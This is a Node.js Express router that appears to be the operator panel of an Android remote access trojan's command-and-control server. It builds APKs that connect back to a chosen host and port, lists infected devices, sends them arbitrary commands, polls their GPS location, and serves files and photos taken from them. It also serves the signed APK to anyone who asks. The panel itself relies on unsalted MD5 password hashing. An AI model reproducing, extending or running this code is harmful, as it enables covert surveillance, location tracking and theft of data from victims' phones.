const express = require('express');
const crypto = require('crypto');
const path = require('path');
const fs = require('fs');
const config = require('./config');
const db = require('./db');
const clients = require('./clients');
const logs = require('./logs');
const builder = require('./builder');

const router = express.Router();

// Auth middleware
function auth(req, res, next) {
    const token = db.main.get('admin.token').value();
    if (req.cookies?.token === token && token) next();
    else res.redirect('/login');
}

// Login
router.get('/login', (req, res) => res.render('login'));
router.post('/login', express.urlencoded({ extended: true }), (req, res) => {
    const { user, pass } = req.body;
    const admin = db.main.get('admin').value();
    const hash = crypto.createHash('md5').update(pass || '').digest('hex');
    
    if (user === admin.user && hash === admin.pass) {
        const token = crypto.randomBytes(16).toString('hex');
        db.main.get('admin').assign({ token }).write();
        logs.log('success', `Admin logged in from ${req.ip}`);
        res.cookie('token', token).redirect('/');
    } else {
        logs.log('error', `Failed login attempt from ${req.ip}`);
        res.redirect('/login?error=1');
    }
});

router.get('/logout', (req, res) => {
    db.main.get('admin').assign({ token: '' }).write();
    res.clearCookie('token').redirect('/login');
});

// Dashboard
router.get('/', auth, (req, res) => {
    res.render('index', { online: clients.online(), offline: clients.offline() });
});

// Builder
router.get('/builder', auth, (req, res) => {
    res.render('builder', { port: config.port });
});

router.post('/builder', auth, (req, res) => {
    const { host, port } = req.query;
    logs.log('info', `Building APK for ${host}:${port}`);
    
    builder.buildApk(host, port, (err) => {
        if (err) {
            logs.log('error', `Build failed: ${err}`);
            res.json({ error: err });
        } else {
            logs.log('success', `APK built successfully for ${host}:${port}`);
            res.json({ success: true });
        }
    });
});

router.get('/builder/progress', auth, (req, res) => {
    res.json({ progress: builder.getProgress() });
});

// Logs
router.get('/logs', auth, (req, res) => {
    res.render('logs', { logs: logs.getLogs() });
});

router.post('/logs/clear', auth, (req, res) => {
    logs.clearLogs();
    res.json({ success: true });
});

// Device management
router.get('/device/:id', auth, (req, res) => {
    res.redirect(`/device/${req.params.id}/info`);
});

router.get('/device/:id/:page', auth, (req, res) => {
    const { id, page } = req.params;
    const data = clients.getData(id, page);
    
    if (data) {
        res.render('device', { id, page, data });
    } else {
        res.render('device', { id, page: 'notfound', data: {} });
    }
});

// Commands
router.post('/cmd/:id/:cmd', auth, express.json(), (req, res) => {
    const { id, cmd } = req.params;
    const params = { ...req.query, ...req.body };
    
    logs.log('info', `Command ${cmd} sent to ${id}`);
    clients.send(id, cmd, params, (err, msg) => {
        res.json(err ? { error: err } : { success: true, message: msg });
    });
});

// GPS polling
router.post('/gps/:id/:interval', auth, (req, res) => {
    clients.setGps(req.params.id, parseInt(req.params.interval) || 0);
    res.json({ success: true });
});

// Static downloads
router.use('/downloads', express.static(config.downloadsPath));
router.use('/photos', express.static(config.photosPath));

// Serve signed APK
router.get('/build.s.apk', (req, res) => {
    if (fs.existsSync(builder.signedApk)) {
        res.download(builder.signedApk);
    } else {
        res.status(404).send('APK not found');
    }
});

module.exports = router;
